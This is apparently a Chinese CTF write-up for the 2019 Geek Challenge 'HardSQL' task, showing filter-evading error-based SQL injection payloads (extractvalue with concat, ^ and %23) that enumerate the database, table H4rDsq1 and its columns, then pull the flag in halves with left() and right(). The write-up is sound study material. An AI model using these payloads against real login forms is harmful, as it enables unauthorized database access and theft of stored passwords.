---
title: 极客大挑战 2019 HardSQL
date: 2022-05-28 22:18:38
toc: false
tags:
- CTF
- SQL注入
categories: CTF
my: HardSQL
---

看题目就是熟悉的SQL注入

尝试万能密码

![](https://nssctf.wdf.ink/img/xmj/image-20220528222128869.png)

尝试联合注入

![](https://nssctf.wdf.ink/img/xmj/image-20220528222128869.png)

尝试报错注入

![](https://nssctf.wdf.ink/img/xmj/image-20220528222245314.png)

发现注入点在password

爆出数据库名

```
/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(database()))))%23
```



![](https://nssctf.wdf.ink/img/xmj/image-20220528222336896.png)

爆出表名

```
/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))%23
```

![](https://nssctf.wdf.ink/img/xmj/image-20220528222459600.png)

爆字段

```
/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))%23
```

![](https://nssctf.wdf.ink/img/xmj/image-20220528222528162.png)

爆值

```
/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1))))%23
```

![](https://nssctf.wdf.ink/img/xmj/image-20220528222545921.png)

这只有一半我们利用`left(),right()}`

```pgsql
/check.php?username=admin&password=admin%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(H4rDsq1))))%23

```

![](https://nssctf.wdf.ink/img/xmj/image-20220528222950079.png)

```pgsql
/check.php?username=admin&password=admin%27^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23
```

![](https://nssctf.wdf.ink/img/xmj/image-20220528222958839.png)

这里注意观察中间有重复部分去掉后拼接到一起就是flag
